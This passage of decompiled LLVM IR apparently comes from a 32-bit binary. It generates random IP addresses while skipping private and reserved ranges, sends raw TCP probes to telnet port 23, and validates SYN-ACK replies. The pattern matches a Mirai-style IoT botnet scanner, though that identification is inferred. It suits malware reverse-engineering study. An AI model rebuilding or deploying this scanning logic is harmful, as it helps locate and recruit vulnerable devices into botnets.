  %v1_804faf8 = udiv i32 %v2_804fae7, 65536
  %v2_804faf8 = mul nuw i32 %v3_804faf4, 65536
  %v1_804fafb = trunc i32 %v1_804faf8 to i16
  %v2_804fafb = call i16 @llvm.bswap.i16(i16 %v1_804fafb)
  %v3_804fafb = zext i16 %v2_804fafb to i32
  %v6_804fafb = or i32 %v2_804faf8, %v3_804fafb
  store i32 %v6_804fafb, i32* %edx.global-to-local, align 4
  store i32 %v6_804fafb, i32* @global_var_8056170.36, align 16
  %v1_804fb05 = load i32, i32* @esp, align 4
  %v2_804fb05 = add i32 %v1_804fb05, -4
  %v3_804fb05 = inttoptr i32 %v2_804fb05 to i32*
  store i32 %v6_804fafb, i32* %v3_804fb05, align 4
  %v0_804fb06 = load i32, i32* %edx.global-to-local, align 4
  %v2_804fb06 = add i32 %v1_804fb05, -8
  %v3_804fb06 = inttoptr i32 %v2_804fb06 to i32*
  store i32 %v0_804fb06, i32* %v3_804fb06, align 4
  %v1_804fb07 = add i32 %v1_804fb05, -12
  %v2_804fb07 = inttoptr i32 %v1_804fb07 to i32*
  store i32 20, i32* %v2_804fb07, align 4
  %v1_804fb09 = add i32 %v1_804fb05, -16
  %v2_804fb09 = inttoptr i32 %v1_804fb09 to i32*
  store i32 ptrtoint (i32* @global_var_8056160.37 to i32), i32* %v2_804fb09, align 4
  %v0_804fb0e = call i32 @function_804d4b0()
  %v1_804fb0e = trunc i32 %v0_804fb0e to i16
  store i16 %v1_804fb0e, i16* bitcast (i32* @global_var_805616a.35 to i16*), align 4
  %v0_804fb19 = load i32, i32* @global_var_8056170.36, align 16
  store i32 %v0_804fb19, i32* %eax.global-to-local, align 4
  %v0_804fb1e = load i32, i32* @esp, align 4
  %v1_804fb1e = add i32 %v0_804fb1e, -4
  %v2_804fb1e = inttoptr i32 %v1_804fb1e to i32*
  store i32 20, i32* %v2_804fb1e, align 4
  store i16 5888, i16* @global_var_8056176.38, align 2
  %v1_804fb29 = add i32 %v0_804fb1e, -8
  %v2_804fb29 = inttoptr i32 %v1_804fb29 to i32*
  store i32 5120, i32* %v2_804fb29, align 4
  %v0_804fb2e = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804fb2e, i32* @global_var_8056178.39, align 8
  %v1_804fb33 = add i32 %v0_804fb1e, -12
  %v2_804fb33 = inttoptr i32 %v1_804fb33 to i32*
  store i32 ptrtoint (i32* @global_var_8056174.40 to i32), i32* %v2_804fb33, align 4
  store i16 0, i16* bitcast (i32* @global_var_8056184.41 to i16*), align 4
  %v1_804fb41 = add i32 %v0_804fb1e, -16
  %v2_804fb41 = inttoptr i32 %v1_804fb41 to i32*
  store i32 ptrtoint (i32* @global_var_8056160.37 to i32), i32* %v2_804fb41, align 4
  %v0_804fb46 = call i32 @function_804d500()
  %v1_804fb46 = trunc i32 %v0_804fb46 to i16
  store i16 %v1_804fb46, i16* bitcast (i32* @global_var_8056184.41 to i16*), align 4
  %v0_804fb51 = load i32, i32* @global_var_8056170.36, align 16
  %v1_804fb56 = load i32, i32* @esp, align 4
  %v2_804fb56 = add i32 %v1_804fb56, 1848
  %v3_804fb56 = inttoptr i32 %v2_804fb56 to i32*
  store i32 %v0_804fb51, i32* %v3_804fb56, align 4
  %v0_804fb5d = load i16, i16* @global_var_8056176.38, align 2
  %v2_804fb63 = load i32, i32* @esp, align 4
  %v3_804fb63 = add i32 %v2_804fb63, 1846
  %v4_804fb63 = inttoptr i32 %v3_804fb63 to i16*
  store i16 %v0_804fb5d, i16* %v4_804fb63, align 2
  %v0_804fb6b = load i32, i32* @esp, align 4
  %v1_804fb6b = add i32 %v0_804fb6b, 1844
  %v2_804fb6b = inttoptr i32 %v1_804fb6b to i16*
  store i16 2, i16* %v2_804fb6b, align 2
  %v0_804fb75 = load i32, i32* @esp, align 4
  %v0_804fb78 = load i32, i32* @global_var_8056600.42, align 512
  store i32 %v0_804fb78, i32* %eax.global-to-local, align 4
  %v1_804fb7d = add i32 %v0_804fb75, 20
  %v2_804fb7d = inttoptr i32 %v1_804fb7d to i32*
  store i32 16, i32* %v2_804fb7d, align 4
  %v0_804fb7f = load i32, i32* @ebp, align 4
  %v2_804fb7f = add i32 %v0_804fb75, 16
  %v3_804fb7f = inttoptr i32 %v2_804fb7f to i32*
  store i32 %v0_804fb7f, i32* %v3_804fb7f, align 4
  %v1_804fb80 = add i32 %v0_804fb75, 12
  %v2_804fb80 = inttoptr i32 %v1_804fb80 to i32*
  store i32 16384, i32* %v2_804fb80, align 4
  %v1_804fb85 = add i32 %v0_804fb75, 8
  %v2_804fb85 = inttoptr i32 %v1_804fb85 to i32*
  store i32 40, i32* %v2_804fb85, align 4
  %v1_804fb87 = add i32 %v0_804fb75, 4
  %v2_804fb87 = inttoptr i32 %v1_804fb87 to i32*
  store i32 ptrtoint (i32* @global_var_8056160.37 to i32), i32* %v2_804fb87, align 4
  %v0_804fb8c = load i32, i32* %eax.global-to-local, align 4
  %v3_804fb8c = inttoptr i32 %v0_804fb75 to i32*
  store i32 %v0_804fb8c, i32* %v3_804fb8c, align 4
  %v0_804fb8d = call i32 @function_80521f7()
  store i32 %v0_804fb8d, i32* %eax.global-to-local, align 4
  %v0_804fb92 = load i32, i32* @esp, align 4
  %v1_804fb92 = add i32 %v0_804fb92, 1884
  %v2_804fb92 = inttoptr i32 %v1_804fb92 to i32*
  %v3_804fb92 = load i32, i32* %v2_804fb92, align 4
  %v1_804fb99 = add i32 %v3_804fb92, 1
  store i32 %v1_804fb99, i32* %eax.global-to-local, align 4
  store i32 %v1_804fb99, i32* %v2_804fb92, align 4
  %v0_804fba1 = load i32, i32* @esp, align 4
  %v1_804fba1 = add i32 %v0_804fba1, 32
  %v0_804fba4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fba4 = add i32 %v0_804fba4, -1023
  %v6_804fba4 = sub i32 1022, %v0_804fba4
  %v7_804fba4 = and i32 %v6_804fba4, %v0_804fba4
  %v8_804fba4 = icmp slt i32 %v7_804fba4, 0
  %v9_804fba4 = icmp eq i32 %v1_804fba4, 0
  %v10_804fba4 = icmp slt i32 %v1_804fba4, 0
  %v3_804fba9 = icmp eq i1 %v10_804fba4, %v8_804fba4
  %v4_804fba9 = icmp eq i1 %v9_804fba4, false
  %v5_804fba9 = and i1 %v4_804fba9, %v3_804fba9
  br i1 %v5_804fba9, label %dec_label_pc_804fc99, label %dec_label_pc_804fbaf

dec_label_pc_804fbaf:                             ; preds = %dec_label_pc_804facb, %dec_label_pc_804fa13
  %v0_804fbaf = phi i32 [ %v1_804fba1, %dec_label_pc_804facb ], [ %v0_804fbaf.pre, %dec_label_pc_804fa13 ]
  %v1_804fbaf = add i32 %v0_804fbaf, 1812
  %v2_804fbaf = inttoptr i32 %v1_804fbaf to i32*
  store i32 0, i32* %v2_804fbaf, align 4
  %v0_804fbba = load i32, i32* @esp, align 4
  %v1_804fbba = add i32 %v0_804fbba, 1816
  %v2_804fbba = inttoptr i32 %v1_804fbba to i32*
  store i32 0, i32* %v2_804fbba, align 4
  %v0_804fbc5 = load i32, i32* @esp, align 4
  %v1_804fbc5 = add i32 %v0_804fbc5, 1820
  %v2_804fbc5 = inttoptr i32 %v1_804fbc5 to i32*
  store i32 0, i32* %v2_804fbc5, align 4
  %v0_804fbd0 = load i32, i32* @esp, align 4
  %v1_804fbd0 = add i32 %v0_804fbd0, 1824
  %v2_804fbd0 = inttoptr i32 %v1_804fbd0 to i32*
  store i32 0, i32* %v2_804fbd0, align 4
  %v0_804fbdb = call i32 @function_804f020()
  %v1_804fbdb = trunc i32 %v0_804fbdb to i16
  store i16 %v1_804fbdb, i16* bitcast (i32* @global_var_8056164.43 to i16*), align 4
  %v0_804fbe6 = load i32, i32* @global_var_80561bc.29, align 4
  store i32 %v0_804fbe6, i32* %eax.global-to-local, align 4
  store i32 %v0_804fbe6, i32* @global_var_805616c.44, align 4
  br label %dec_label_pc_804fbf0.preheader

dec_label_pc_804fbf0.preheader:                   ; preds = %dec_label_pc_804fbaf, %dec_label_pc_804fa5d, %dec_label_pc_804fa68, %dec_label_pc_804fa71, %dec_label_pc_804fa7a, %dec_label_pc_804fa83, %dec_label_pc_804fa8c, %dec_label_pc_804fa95, %dec_label_pc_804fa9e, %dec_label_pc_804faa7, %dec_label_pc_804fab0, %dec_label_pc_804fab9, %dec_label_pc_804fac2, %dec_label_pc_804fc5a, %dec_label_pc_804fc79, %dec_label_pc_804fa54, %dec_label_pc_804fc8b
  br label %dec_label_pc_804fbf0

dec_label_pc_804fbf0:                             ; preds = %dec_label_pc_804fc43, %dec_label_pc_804fc2c, %dec_label_pc_804fc1e, %dec_label_pc_804fc19, %dec_label_pc_804fc12, %dec_label_pc_804fc0e, %dec_label_pc_804fc0a, %dec_label_pc_804fbf0, %dec_label_pc_804fbf0.preheader
  %v0_804fbf0 = call i32 @function_804f020()
  store i32 %v0_804fbf0, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v0_804fbf0, 65536
  %v1_804fbf5 = sdiv i32 %sext, 65536
  %v2_804fbfb = urem i32 %v0_804fbf0, 256
  %v3_804fbfb = load i32, i32* @ecx, align 4
  %v4_804fbfb = and i32 %v3_804fbfb, -256
  %v5_804fbfb = or i32 %v4_804fbfb, %v2_804fbfb
  store i32 %v5_804fbfb, i32* @ecx, align 4
  %v2_804fbfd = udiv i32 %v1_804fbf5, 256
  store i32 %v2_804fbfd, i32* @ebx, align 4
  %v2_804fc00 = udiv i32 %v1_804fbf5, 65536
  store i32 %v2_804fc00, i32* @edx, align 4
  %v2_804fc03 = udiv i32 %v1_804fbf5, 16777216
  store i32 %v2_804fc03, i32* @edi, align 4
  %v2_804fc06 = trunc i32 %v0_804fbf0 to i8
  %v11_804fc06 = icmp eq i8 %v2_804fc06, 127
  br i1 %v11_804fc06, label %dec_label_pc_804fbf0, label %dec_label_pc_804fc0a

dec_label_pc_804fc0a:                             ; preds = %dec_label_pc_804fbf0
  %v6_804fc0a = icmp eq i8 %v2_804fc06, 0
  br i1 %v6_804fc0a, label %dec_label_pc_804fbf0, label %dec_label_pc_804fc0e

dec_label_pc_804fc0e:                             ; preds = %dec_label_pc_804fc0a
  %v11_804fc0e = icmp eq i8 %v2_804fc06, 3
  br i1 %v11_804fc0e, label %dec_label_pc_804fbf0, label %dec_label_pc_804fc12

dec_label_pc_804fc12:                             ; preds = %dec_label_pc_804fc0e
  %v2_804fc12 = add nsw i32 %v1_804fbf5, -15
  store i32 %v2_804fc12, i32* %eax.global-to-local, align 4
  %v1_804fc15 = trunc i32 %v2_804fc12 to i8
  %tmp262 = or i8 %v1_804fc15, 1
  %tmp263 = icmp eq i8 %tmp262, 1
  br i1 %tmp263, label %dec_label_pc_804fbf0, label %dec_label_pc_804fc19

dec_label_pc_804fc19:                             ; preds = %dec_label_pc_804fc12
  %v10_804fc19 = icmp eq i8 %v2_804fc06, 56
  br i1 %v10_804fc19, label %dec_label_pc_804fbf0, label %dec_label_pc_804fc1e

dec_label_pc_804fc1e:                             ; preds = %dec_label_pc_804fc19
  %v10_804fc1e = icmp eq i8 %v2_804fc06, 10
  br i1 %v10_804fc1e, label %dec_label_pc_804fbf0, label %dec_label_pc_804fc23

dec_label_pc_804fc23:                             ; preds = %dec_label_pc_804fc1e
  %v8_804fc23 = icmp eq i8 %v2_804fc06, -64
  %v1_804fc26 = icmp eq i1 %v8_804fc23, false
  br i1 %v1_804fc26, label %dec_label_pc_804fa30, label %dec_label_pc_804fc2c

dec_label_pc_804fc2c:                             ; preds = %dec_label_pc_804fc23
  %v1_804fc2c = trunc i32 %v2_804fbfd to i8
  %v11_804fc2c = icmp eq i8 %v1_804fc2c, -88
  br i1 %v11_804fc2c, label %dec_label_pc_804fbf0, label %dec_label_pc_804fc31

dec_label_pc_804fc31:                             ; preds = %dec_label_pc_804fc2c
  %v10_804fc31 = icmp eq i8 %v2_804fc06, 100
  %v1_804fc34 = icmp eq i1 %v10_804fc31, false
  br i1 %v1_804fc34, label %dec_label_pc_804fa42, label %dec_label_pc_804fc3a

dec_label_pc_804fc3a:                             ; preds = %dec_label_pc_804fa39.dec_label_pc_804fc3a_crit_edge, %dec_label_pc_804fc31
  %v1_804fc3a.pre-phi = phi i8 [ %.pre, %dec_label_pc_804fa39.dec_label_pc_804fc3a_crit_edge ], [ %v1_804fc2c, %dec_label_pc_804fc31 ]
  %tmp264 = icmp ult i8 %v1_804fc3a.pre-phi, 64
  br i1 %tmp264, label %dec_label_pc_804fa5d, label %dec_label_pc_804fc43

dec_label_pc_804fc43:                             ; preds = %dec_label_pc_804fc3a
  %tmp265 = icmp ult i8 %v1_804fc3a.pre-phi, 127
  br i1 %tmp265, label %dec_label_pc_804fbf0, label %dec_label_pc_804fc48

dec_label_pc_804fc48:                             ; preds = %dec_label_pc_804fc43
  %v11_804fc48 = icmp eq i8 %v2_804fc06, -58
  %v1_804fc4b = icmp eq i1 %v11_804fc48, false
  br i1 %v1_804fc4b, label %dec_label_pc_804fa54, label %dec_label_pc_804fc51

dec_label_pc_804fc51:                             ; preds = %dec_label_pc_804fc48, %dec_label_pc_804fa4b
  %v0_804fc5a = phi i32 [ %v2_804fbfd, %dec_label_pc_804fc48 ], [ %v0_804fad358, %dec_label_pc_804fa4b ]
  %v0_804fa5d54 = phi i32 [ %v5_804fbfb, %dec_label_pc_804fc48 ], [ %v0_804fa4b, %dec_label_pc_804fa4b ]
  %v1_804fc51 = trunc i32 %v0_804fc5a to i8
  %tmp266 = icmp ult i8 %v1_804fc51, 18
  br i1 %tmp266, label %dec_label_pc_804fa5d, label %dec_label_pc_804fc5a

dec_label_pc_804fc5a:                             ; preds = %dec_label_pc_804fc51
  %tmp267 = or i8 %v1_804fc51, 1
  %tmp268 = icmp eq i8 %tmp267, 19
  br i1 %tmp268, label %dec_label_pc_804fbf0.preheader, label %dec_label_pc_804fa5d

dec_label_pc_804fc64:                             ; preds = %dec_label_pc_80509ce
  %v2_804fc67 = inttoptr i32 %v0_80509da to i32*
  store i32 0, i32* %v2_804fc67, align 4
  %v1_804fc69 = call i32 @function_80535c9(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804fc69, i32* %eax.global-to-local, align 4
  %v0_804fc70.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804fc70

dec_label_pc_804fc70:                             ; preds = %dec_label_pc_804fa30, %dec_label_pc_804fc64
  %v0_804fc79 = phi i32 [ %v0_804fc70.pre, %dec_label_pc_804fc64 ], [ %v2_804fbfd, %dec_label_pc_804fa30 ]
  %v1_804fc70 = trunc i32 %v0_804fc79 to i8
  %tmp269 = icmp ult i8 %v1_804fc70, 16
  br i1 %tmp269, label %dec_label_pc_804fc70.dec_label_pc_804fa5d_crit_edge, label %dec_label_pc_804fc79

dec_label_pc_804fc70.dec_label_pc_804fa5d_crit_edge: ; preds = %dec_label_pc_804fc70
  %v0_804fa5d.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804fa5d

dec_label_pc_804fc79:                             ; preds = %dec_label_pc_804fc70
  %tmp270 = icmp ult i8 %v1_804fc70, 32
  br i1 %tmp270, label %dec_label_pc_804fbf0.preheader, label %dec_label_pc_804fc82

dec_label_pc_804fc82:                             ; preds = %dec_label_pc_804fc79
  %v0_804fc82 = load i32, i32* @ecx, align 4
  %v1_804fc82 = trunc i32 %v0_804fc82 to i8
  %v11_804fc82 = icmp eq i8 %v1_804fc82, -87
  %v1_804fc85 = icmp eq i1 %v11_804fc82, false
  br i1 %v1_804fc85, label %dec_label_pc_804fa4b, label %dec_label_pc_804fc8b

dec_label_pc_804fc8b:                             ; preds = %dec_label_pc_804fc82, %dec_label_pc_804fa42
  %v0_804fa5465 = phi i32 [ %v0_804fc82, %dec_label_pc_804fc82 ], [ %v5_804fbfb, %dec_label_pc_804fa42 ]
  %v0_804fc8b = phi i32 [ %v0_804fc79, %dec_label_pc_804fc82 ], [ %v2_804fbfd, %dec_label_pc_804fa42 ]
  %v1_804fc8b = trunc i32 %v0_804fc8b to i8
  %v11_804fc8b = icmp eq i8 %v1_804fc8b, -1
  %v1_804fc8e = icmp eq i1 %v11_804fc8b, false
  br i1 %v1_804fc8e, label %dec_label_pc_804fa54, label %dec_label_pc_804fbf0.preheader

dec_label_pc_804fc99:                             ; preds = %dec_label_pc_804facb
  %v0_804fc99 = load i32, i32* @esi, align 4
  %v2_804fc99 = add i32 %v0_804fba1, 48
  %v3_804fc99 = inttoptr i32 %v2_804fc99 to i32*
  store i32 %v0_804fc99, i32* %v3_804fc99, align 4
  br label %dec_label_pc_804fc9d

dec_label_pc_804fc9d:                             ; preds = %.loopexit, %dec_label_pc_804fc99
  %v1_804fc9d = call i32 @function_8051fb9(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804fc9d, i32* %eax.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v1_804fca4 = load i32, i32* @esp, align 4
  %v2_804fca4 = add i32 %v1_804fca4, 24
  %v3_804fca4 = inttoptr i32 %v2_804fca4 to i32*
  store i32 %v1_804fc9d, i32* %v3_804fca4, align 4
  br label %dec_label_pc_804fca8

dec_label_pc_804fca8:                             ; preds = %dec_label_pc_804fd2f, %dec_label_pc_804fd27, %dec_label_pc_804fd23, %dec_label_pc_804fd1f, %dec_label_pc_804fd17, %dec_label_pc_804fd0b, %dec_label_pc_804fd02, %dec_label_pc_804fcfb, %dec_label_pc_804fcef, %dec_label_pc_804fcea, %dec_label_pc_804fd92, %dec_label_pc_804fc9d
  %v0_804fca8 = load i32, i32* @esp, align 4
  %v1_804fca8 = add i32 %v0_804fca8, 24
  %v2_804fca8 = inttoptr i32 %v1_804fca8 to i32*
  %v3_804fca8 = load i32, i32* %v2_804fca8, align 4
  store i32 %v3_804fca8, i32* %ecx.global-to-local, align 4
  %v1_804fcac = inttoptr i32 %v3_804fca8 to i32*
  store i32 0, i32* %v1_804fcac, align 4
  %v0_804fcb2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fcb2 = load i32, i32* @esp, align 4
  %v2_804fcb2 = add i32 %v1_804fcb2, -4
  %v3_804fcb2 = inttoptr i32 %v2_804fcb2 to i32*
  store i32 %v0_804fcb2, i32* %v3_804fcb2, align 4
  %v0_804fcb3 = load i32, i32* %eax.global-to-local, align 4
  %v2_804fcb3 = add i32 %v1_804fcb2, -8
  %v3_804fcb3 = inttoptr i32 %v2_804fcb3 to i32*
  store i32 %v0_804fcb3, i32* %v3_804fcb3, align 4
  %v1_804fcb4 = add i32 %v1_804fcb2, -12
  %v2_804fcb4 = inttoptr i32 %v1_804fcb4 to i32*
  store i32 0, i32* %v2_804fcb4, align 4
  %v1_804fcb6 = add i32 %v1_804fcb2, -16
  %v2_804fcb6 = inttoptr i32 %v1_804fcb6 to i32*
  store i32 0, i32* %v2_804fcb6, align 4
  %v1_804fcb8 = add i32 %v1_804fcb2, -20
  %v2_804fcb8 = inttoptr i32 %v1_804fcb8 to i32*
  store i32 16384, i32* %v2_804fcb8, align 4
  %v1_804fcbd = add i32 %v1_804fcb2, -24
  %v2_804fcbd = inttoptr i32 %v1_804fcbd to i32*
  store i32 1514, i32* %v2_804fcbd, align 4
  %v1_804fcc2 = add i32 %v1_804fcb2, 42
  %v2_804fcc6 = add i32 %v1_804fcb2, -28
  %v3_804fcc6 = inttoptr i32 %v2_804fcc6 to i32*
  store i32 %v1_804fcc2, i32* %v3_804fcc6, align 4
  %v0_804fcc7 = load i32, i32* @global_var_8056600.42, align 512
  store i32 %v0_804fcc7, i32* %eax.global-to-local, align 4
  %v2_804fccc = add i32 %v1_804fcb2, -32
  %v3_804fccc = inttoptr i32 %v2_804fccc to i32*
  store i32 %v0_804fcc7, i32* %v3_804fccc, align 4
  %v0_804fccd = call i32 @function_8052181()
  store i32 %v0_804fccd, i32* %eax.global-to-local, align 4
  %v0_804fcd2 = load i32, i32* @esp, align 4
  %tmp = icmp slt i32 %v0_804fccd, 1
  br i1 %tmp, label %dec_label_pc_804fdc0, label %dec_label_pc_804fcdd

dec_label_pc_804fcdd:                             ; preds = %dec_label_pc_804fca8
  %v1_804fcdd = add i32 %v0_804fcd2, 56
  %v2_804fcdd = inttoptr i32 %v1_804fcdd to i32*
  %v3_804fcdd = load i32, i32* %v2_804fcdd, align 4
  store i32 %v3_804fcdd, i32* %edx.global-to-local, align 4
  %v1_804fce1 = inttoptr i32 %v3_804fcdd to i32*
  %v2_804fce1 = load i32, i32* %v1_804fce1, align 4
  %v11_804fce1 = icmp eq i32 %v2_804fce1, 11
  br i1 %v11_804fce1, label %dec_label_pc_804fdc0, label %dec_label_pc_804fcea

dec_label_pc_804fcea:                             ; preds = %dec_label_pc_804fcdd
  %tmp271 = icmp ult i32 %v0_804fccd, 40
  br i1 %tmp271, label %dec_label_pc_804fca8, label %dec_label_pc_804fcef

dec_label_pc_804fcef:                             ; preds = %dec_label_pc_804fcea
  %v1_804fcef = add i32 %v0_804fcd2, 90
  %v2_804fcef = inttoptr i32 %v1_804fcef to i32*
  %v3_804fcef = load i32, i32* %v2_804fcef, align 4
  store i32 %v3_804fcef, i32* %eax.global-to-local, align 4
  %v1_804fcf3 = load i32, i32* @global_var_80561bc.29, align 4
  %v12_804fcf3 = icmp eq i32 %v3_804fcef, %v1_804fcf3
  %v1_804fcf9 = icmp eq i1 %v12_804fcf3, false
  br i1 %v1_804fcf9, label %dec_label_pc_804fca8, label %dec_label_pc_804fcfb

dec_label_pc_804fcfb:                             ; preds = %dec_label_pc_804fcef
  %v1_804fcfb = add i32 %v0_804fcd2, 83
  %v2_804fcfb = inttoptr i32 %v1_804fcfb to i8*
  %v3_804fcfb = load i8, i8* %v2_804fcfb, align 1
  %v12_804fcfb = icmp eq i8 %v3_804fcfb, 6
  %v1_804fd00 = icmp eq i1 %v12_804fcfb, false
  br i1 %v1_804fd00, label %dec_label_pc_804fca8, label %dec_label_pc_804fd02

dec_label_pc_804fd02:                             ; preds = %dec_label_pc_804fcfb
  %v1_804fd02 = add i32 %v0_804fcd2, 94
  %v2_804fd02 = inttoptr i32 %v1_804fd02 to i16*
  %v3_804fd02 = load i16, i16* %v2_804fd02, align 2
  %v9_804fd02 = icmp eq i16 %v3_804fd02, 5888
  %v1_804fd09 = icmp eq i1 %v9_804fd02, false
  br i1 %v1_804fd09, label %dec_label_pc_804fca8, label %dec_label_pc_804fd0b

dec_label_pc_804fd0b:                             ; preds = %dec_label_pc_804fd02
  %v1_804fd0b = add i32 %v0_804fcd2, 46
  %v2_804fd0b = inttoptr i32 %v1_804fd0b to i16*
  %v3_804fd0b = load i16, i16* %v2_804fd0b, align 2
  %v4_804fd0b = zext i16 %v3_804fd0b to i32
  %v5_804fd0b = load i32, i32* @ecx, align 4
  %v6_804fd0b = and i32 %v5_804fd0b, -65536
  %v7_804fd0b = or i32 %v6_804fd0b, %v4_804fd0b
  store i32 %v7_804fd0b, i32* %ecx.global-to-local, align 4
  %v3_804fd10 = add i32 %v0_804fcd2, 96
  %v4_804fd10 = inttoptr i32 %v3_804fd10 to i16*
  %v5_804fd10 = load i16, i16* %v4_804fd10, align 2
  %v16_804fd10 = icmp eq i16 %v3_804fd0b, %v5_804fd10
  %v1_804fd15 = icmp eq i1 %v16_804fd10, false
  br i1 %v1_804fd15, label %dec_label_pc_804fca8, label %dec_label_pc_804fd17

dec_label_pc_804fd17:                             ; preds = %dec_label_pc_804fd0b
  %v1_804fd17 = add i32 %v0_804fcd2, 107
  %v2_804fd17 = inttoptr i32 %v1_804fd17 to i8*
  %v3_804fd17 = load i8, i8* %v2_804fd17, align 1
  %v4_804fd17 = zext i8 %v3_804fd17 to i32
  %v6_804fd17 = and i32 %v3_804fcef, -256
  %v7_804fd17 = or i32 %v4_804fd17, %v6_804fd17
  store i32 %v7_804fd17, i32* %eax.global-to-local, align 4
  %v2_804fd1b = and i8 %v3_804fd17, 2
  %v3_804fd1b = icmp eq i8 %v2_804fd1b, 0
  br i1 %v3_804fd1b, label %dec_label_pc_804fca8, label %dec_label_pc_804fd1f

dec_label_pc_804fd1f:                             ; preds = %dec_label_pc_804fd17
  %v2_804fd1f = and i32 %v4_804fd17, 16
  %v3_804fd1f = icmp eq i32 %v2_804fd1f, 0
  br i1 %v3_804fd1f, label %dec_label_pc_804fca8, label %dec_label_pc_804fd23

dec_label_pc_804fd23:                             ; preds = %dec_label_pc_804fd1f
  %v2_804fd23 = and i32 %v4_804fd17, 4
  %v3_804fd23 = icmp eq i32 %v2_804fd23, 0
  %v1_804fd25 = icmp eq i1 %v3_804fd23, false
  br i1 %v1_804fd25, label %dec_label_pc_804fca8, label %dec_label_pc_804fd27

dec_label_pc_804fd27:                             ; preds = %dec_label_pc_804fd23
  %tmp277 = urem i8 %v3_804fd17, 2
  %v3_804fd27 = icmp eq i8 %tmp277, 0
  %v1_804fd29 = icmp eq i1 %v3_804fd27, false
  br i1 %v1_804fd29, label %dec_label_pc_804fca8, label %dec_label_pc_804fd2f

dec_label_pc_804fd2f:                             ; preds = %dec_label_pc_804fd27
  %v1_804fd2f = add i32 %v0_804fcd2, 102
  %v2_804fd2f = inttoptr i32 %v1_804fd2f to i32*
  %v3_804fd2f = load i32, i32* %v2_804fd2f, align 4
  %v1_804fd33 = trunc i32 %v3_804fd2f to i16
  %v2_804fd33 = call i16 @llvm.bswap.i16(i16 %v1_804fd33)
  %v3_804fd33 = zext i16 %v2_804fd33 to i32
  %v1_804fd37 = udiv i32 %v3_804fd2f, 65536
  %v2_804fd37 = mul nuw i32 %v3_804fd33, 65536
  %v1_804fd3a = trunc i32 %v1_804fd37 to i16
  %v2_804fd3a = call i16 @llvm.bswap.i16(i16 %v1_804fd3a)
  %v3_804fd3a = zext i16 %v2_804fd3a to i32
  %v6_804fd3a = or i32 %v3_804fd3a, %v2_804fd37
  %v1_804fd3e = add i32 %v6_804fd3a, -1
  %v1_804fd3f = trunc i32 %v1_804fd3e to i16
  %v2_804fd3f = call i16 @llvm.bswap.i16(i16 %v1_804fd3f)
  %v3_804fd3f = zext i16 %v2_804fd3f to i32
  %v1_804fd43 = udiv i32 %v1_804fd3e, 65536
  %v2_804fd43 = mul nuw i32 %v3_804fd3f, 65536
  %v1_804fd46 = trunc i32 %v1_804fd43 to i16
  %v2_804fd46 = call i16 @llvm.bswap.i16(i16 %v1_804fd46)
  %v3_804fd46 = zext i16 %v2_804fd46 to i32
  %v6_804fd46 = or i32 %v3_804fd46, %v2_804fd43
  store i32 %v6_804fd46, i32* %eax.global-to-local, align 4
  %v1_804fd4a = add i32 %v0_804fcd2, 86
  %v2_804fd4a = inttoptr i32 %v1_804fd4a to i32*
  %v3_804fd4a = load i32, i32* %v2_804fd4a, align 4
  %v15_804fd4a = icmp eq i32 %v3_804fd4a, %v6_804fd46
  %v1_804fd4e = icmp eq i1 %v15_804fd4a, false
  br i1 %v1_804fd4e, label %dec_label_pc_804fca8, label %dec_label_pc_804fd54

dec_label_pc_804fd54:                             ; preds = %dec_label_pc_804fd2f
  %v0_804fd54 = load i32, i32* %esi.global-to-local, align 4
  %v1_804fd54 = add i32 %v0_804fd54, -255
  %v6_804fd54 = sub i32 254, %v0_804fd54
  %v7_804fd54 = and i32 %v6_804fd54, %v0_804fd54
  %v8_804fd54 = icmp slt i32 %v7_804fd54, 0
  %v9_804fd54 = icmp eq i32 %v1_804fd54, 0
  %v10_804fd54 = icmp slt i32 %v1_804fd54, 0
  %v3_804fd5a = icmp eq i1 %v10_804fd54, %v8_804fd54
  %v4_804fd5a = icmp eq i1 %v9_804fd54, false
  %v5_804fd5a = and i1 %v4_804fd5a, %v3_804fd5a
  br i1 %v5_804fd5a, label %dec_label_pc_804fdc0, label %dec_label_pc_804fd5c

dec_label_pc_804fd5c:                             ; preds = %dec_label_pc_804fd54
  %v0_804fd5f = load i32, i32* @global_var_80561e0.45, align 32
  store i32 %v0_804fd5f, i32* %eax.global-to-local, align 4
  %v2_804fd64 = mul i32 %v0_804fd54, 288
  store i32 %v0_804fd54, i32* @ebx, align 4
  %v2_804fd69 = add i32 %v0_804fd5f, %v2_804fd64
  store i32 %v2_804fd69, i32* %edx.global-to-local, align 4
  %v1_804fd6b = add i32 %v2_804fd69, 12
  %v2_804fd6b = inttoptr i32 %v1_804fd6b to i32*
  %v3_804fd6b = load i32, i32* %v2_804fd6b, align 4
  store i32 %v3_804fd6b, i32* %eax.global-to-local, align 4
  %v1_804fd6e = icmp eq i32 %v3_804fd6b, 0
  br i1 %v1_804fd6e, label %dec_label_pc_804fd92, label %dec_label_pc_804fd72

dec_label_pc_804fd72:                             ; preds = %dec_label_pc_804fd5c
  %v1_804fd72 = add i32 %v2_804fd69, 288
  store i32 %v1_804fd72, i32* %ecx.global-to-local, align 4
  store i32 %v0_804fd54, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fd7a

dec_label_pc_804fd7a:                             ; preds = %dec_label_pc_804fd83, %dec_label_pc_804fd72
  %v0_804fd83 = phi i32 [ %v1_804fd88, %dec_label_pc_804fd83 ], [ %v1_804fd72, %dec_label_pc_804fd72 ]
  %v0_804fd7a = phi i32 [ %v1_804fd7a, %dec_label_pc_804fd83 ], [ %v0_804fd54, %dec_label_pc_804fd72 ]
  %v1_804fd7a = add i32 %v0_804fd7a, 1
  store i32 %v1_804fd7a, i32* @ebx, align 4
  %v6_804fd7b = icmp eq i32 %v0_804fd7a, 255
  br i1 %v6_804fd7b, label %dec_label_pc_804fdc0.loopexit, label %dec_label_pc_804fd83

dec_label_pc_804fd83:                             ; preds = %dec_label_pc_804fd7a
  %v1_804fd83 = add i32 %v0_804fd83, 12
  %v2_804fd83 = inttoptr i32 %v1_804fd83 to i32*
  %v3_804fd83 = load i32, i32* %v2_804fd83, align 4
